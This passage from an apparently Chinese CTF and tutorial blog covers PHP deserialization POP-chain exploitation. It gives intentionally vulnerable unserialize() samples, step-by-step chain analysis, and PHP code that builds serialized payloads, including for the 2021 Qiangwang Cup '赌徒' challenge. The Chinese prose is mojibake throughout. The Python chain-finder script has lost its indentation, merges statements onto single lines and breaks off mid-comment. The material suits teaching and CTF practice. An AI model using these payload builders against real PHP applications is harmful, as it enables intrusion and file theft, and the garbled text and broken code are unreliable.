é“¾åˆ©ç”¨</h3><p>æœ‰ä¸¤ç§æƒ…å½¢ï¼š</p><ul><li>åœ¨ PHP é­”æœ¯æ–¹æ³•ä¸­å‡ºç°ç¼ºé™·ä»£ç ï¼Œè‡ªåŠ¨è°ƒç”¨è€Œè§¦å‘æ¼æ´</li><li>ç¼ºé™·ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å°±è¦å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åï¼Œå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°(èƒ½èƒŒåˆ©ç”¨çš„åŒåå‡½æ•°)çš„å±æ€§è”ç³»èµ·æ¥ã€‚</li></ul><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°éœ€è¦æ‰§è¡Œ GetFlag ç±»ä¸­çš„ get_flag()å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ã€‚è¦è®©è¿™ä¸ªæ–¹æ³•æ‰§è¡Œï¼Œéœ€è¦æ„é€ ä¸€ä¸ª POP é“¾ã€‚</p><ol><li><p><code>string1</code>ä¸­çš„<code>__tostring</code>å­˜åœ¨<code>$this-&gt;str1-&gt;get_flag()</code>ï¼Œåˆ†æä¸€ä¸‹è¦è‡ªåŠ¨è°ƒç”¨<code>__tostring()</code>éœ€è¦æŠŠç±»<code>string1</code>å½“æˆå­—ç¬¦ä¸²æ¥ä½¿ç”¨ï¼Œå› ä¸ºè°ƒç”¨çš„æ˜¯å‚æ•°<code>str1</code>çš„æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æŠŠ<code>str1</code>èµ‹å€¼ä¸ºç±»<code>GetFlag</code>çš„å¯¹è±¡ã€‚</p></li><li><p>å‘ç°ç±»<code>func</code>ä¸­å­˜åœ¨<code>__invoke</code>æ–¹æ³•æ‰§è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œéœ€è¦æŠŠ<code>func</code>å½“æˆå‡½æ•°ä½¿ç”¨è‡ªåŠ¨è°ƒç”¨<code>__invoke</code>ç„¶åæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>string1</code>çš„å¯¹è±¡ä¸<code>$mod2</code>æ‹¼æ¥ã€‚</p></li><li><p>åœ¨<code>funct</code>ä¸­æ‰¾åˆ°äº†å‡½æ•°è°ƒç”¨ï¼Œéœ€è¦æŠŠ<code>mod1</code>èµ‹å€¼ä¸º<code>func</code>ç±»çš„å¯¹è±¡ï¼Œåˆå› ä¸ºå‡½æ•°è°ƒç”¨åœ¨<code>__call</code>æ–¹æ³•ä¸­ï¼Œä¸”å‚æ•°ä¸º<code>$test2</code>,å³æ— æ³•è°ƒç”¨<code>test2</code>æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ <code>__call</code>æ–¹æ³•ï¼›</p></li><li><p>åœ¨<code>Call</code>ä¸­çš„<code>test1</code>æ–¹æ³•ä¸­å­˜åœ¨<code>$this-&gt;mod1-&gt;test2();</code>ï¼Œéœ€è¦æŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>funct</code>çš„å¯¹è±¡ï¼Œè®©<code>__call</code>è‡ªåŠ¨è°ƒç”¨ã€‚</p></li><li><p>æŸ¥æ‰¾<code>test1</code>æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œåœ¨<code>start_gg</code>ä¸­å‘ç°<code>$this-&gt;mod1-&gt;test1();</code>ï¼ŒæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>start_gg</code>ç±»çš„å¯¹è±¡ï¼Œç­‰å¾…<code>__destruct()</code>è‡ªåŠ¨è°ƒç”¨ã€‚</p></li></ol><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//æŠŠ$mod1èµ‹å€¼ä¸ºCallç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfunctç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfuncç±»å¯¹è±¡</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//æŠŠ $mod1èµ‹å€¼ä¸ºstring1ç±»å¯¹è±¡</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//æŠŠ $str1èµ‹å€¼ä¸ºGetFlagç±»å¯¹è±¡</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//æ„é€ start_ggç±»å¯¹è±¡$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//æ˜¾ç¤ºè¾“å‡ºurlç¼–ç åçš„åºåˆ—åŒ–å¯¹è±¡</span><br></code></pre></td></tr></table></figure><h4 id="2021-å¼ºç½‘æ¯èµŒå¾’"><a href="#2021-å¼ºç½‘æ¯èµŒå¾’" class="headerlink" title="2021 å¼ºç½‘æ¯èµŒå¾’"></a>2021 å¼ºç½‘æ¯èµŒå¾’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h4 id="2021-å¼ºç½‘æ¯-POP-masterï¼š"><a href="#2021-å¼ºç½‘æ¯-POP-masterï¼š" class="headerlink" title="2021 å¼ºç½‘æ¯ POP_masterï¼š"></a>2021 å¼ºç½‘æ¯ POP_masterï¼š</h4><p><a href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p><p>è„šæœ¬æ‰¾é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># å¼ºèµ‹å€¼å‡½æ•°ç›´æ¥è·³è¿‡</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>class_name = out.name<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br><span class="hljs-keyword">if</span> node.name == func_name:<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br><span class="hljs-comment"># 